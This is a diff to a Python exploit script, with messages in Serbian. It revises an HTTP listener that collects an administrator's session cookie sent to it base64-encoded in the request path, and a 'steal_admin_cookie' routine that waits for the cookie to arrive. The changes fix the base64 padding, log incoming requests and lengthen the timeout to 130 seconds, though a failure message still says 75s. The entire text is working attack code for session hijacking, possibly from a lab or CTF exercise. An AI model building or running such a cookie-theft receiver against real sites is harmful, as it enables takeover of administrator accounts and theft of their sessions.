@@ -103,9 +103,10 @@ stolen_cookie = None
 class CookieListener(BaseHTTPRequestHandler):
     def do_GET(self):
         global stolen_cookie
-        encoded = self.path.lstrip('/')
+        encoded = self.path.split('/', 1)[-1]
+        print(f"[+] Zahtev primljen: {self.path[:80]}")
         try:
-            stolen_cookie = base64.b64decode(encoded).decode()
+            stolen_cookie = base64.b64decode(encoded + '=' * (-len(encoded) % 4)).decode()
         except Exception:
             stolen_cookie = self.path
         self.send_response(200)
@@ -143,7 +144,10 @@ def steal_admin_cookie(base: str, user_session: requests.Session) -> str:
     server  = HTTPServer(('0.0.0.0', LPORT), CookieListener)
     listener = threading.Thread(target=server.serve_forever)
     listener.start()
-    listener.join(timeout=75)
+    listener.join(timeout=130)
+
+    if listener.is_alive():
+        server.shutdown()
 
     if not stolen_cookie:
         print("    [-] Admin cookie nije stigao u roku od 75s. Pokusaj ponovo.")
